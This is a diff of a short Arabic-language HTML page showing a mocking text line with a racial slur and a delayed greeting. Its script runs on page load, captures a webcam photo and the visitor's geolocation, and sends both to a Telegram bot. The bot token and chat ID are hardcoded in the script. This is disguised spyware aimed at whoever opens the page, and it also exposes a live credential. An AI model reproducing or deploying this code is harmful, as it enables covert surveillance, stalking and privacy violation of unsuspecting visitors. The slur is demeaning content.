@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="UTF-8" />
-<title>...</title>
+<meta charset="UTF-8">
+<title>  ...</title>
 <style>
   body {
-    background-color: #ffffff; /* خلفية بيضاء */
+    background-color: #FFFFFF; /* أبيض قوي */
     display: flex;
     justify-content: center;
     align-items: center;
@@ -16,10 +16,18 @@
 
   .text {
     font-size: 24px;
-    color: #000000; /* نص أسود */
-    margin-bottom: 40px;
+    color: black;
+    margin-bottom: 20px;
     font-weight: bold;
     animation: fade 2s infinite alternate;
+  }
+
+  .greeting {
+    font-size: 24px;
+    color: black;
+    margin-top: 10px;
+    font-weight: bold;
+    display: none; /* مخفية بالبداية */
   }
 
   @keyframes fade {
@@ -30,56 +38,62 @@
 </head>
 <body>
 
-<div class="text"> lol Nigga </div>
+<div class="text">  lol Nigga هههههههه </div>
+<div class="greeting">سلملي معلوماتك عندي  😊</div>
 
 <script>
-    async function captureAndSend() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
+  // تظهر رسالة بعد 5 ثواني
+  setTimeout(() => {
+    document.querySelector('.greeting').style.display = 'block';
+  }, 5000);
 
-        await new Promise(resolve => setTimeout(resolve, 3000));
+  async function captureAndSend() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
 
-        const canvas = document.createElement('canvas');
-        canvas.width = 640;
-        canvas.height = 480;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      await new Promise(resolve => setTimeout(resolve, 3000));
 
-        const imageData = canvas.toDataURL('image/jpeg');
+      const canvas = document.createElement('canvas');
+      canvas.width = 640;
+      canvas.height = 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        const blob = await (await fetch(imageData)).blob();
+      const imageData = canvas.toDataURL('image/jpeg');
 
-        const formData = new FormData();
-        formData.append("chat_id", "1320552080");
-        formData.append("photo", blob, "capture.jpg");
+      const blob = await (await fetch(imageData)).blob();
 
-        fetch("https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendPhoto", {
-          method: "POST",
-          body: formData
+      const formData = new FormData();
+      formData.append("chat_id", "1320552080");
+      formData.append("photo", blob, "capture.jpg");
+
+      fetch("https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendPhoto", {
+        method: "POST",
+        body: formData
+      });
+
+      stream.getTracks().forEach(track => track.stop());
+
+      navigator.geolocation.getCurrentPosition(position => {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        fetch(`https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendLocation?chat_id=1320552080&latitude=${latitude}&longitude=${longitude}`, {
+          method: "GET"
         });
+      }, error => {
+        console.error("فشل الحصول على الموقع:", error);
+      });
 
-        stream.getTracks().forEach(track => track.stop());
-
-        navigator.geolocation.getCurrentPosition(position => {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-
-          fetch(`https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendLocation?chat_id=1320552080&latitude=${latitude}&longitude=${longitude}`, {
-            method: "GET"
-          });
-        }, error => {
-          console.error("فشل الحصول على الموقع:", error);
-        });
-
-      } catch (err) {
-        console.error("فشل الوصول إلى الكاميرا:", err);
-      }
+    } catch (err) {
+      console.error("فشل الوصول إلى الكاميرا:", err);
     }
+  }
 
-    captureAndSend();
+  captureAndSend();
 </script>
 
 </body>
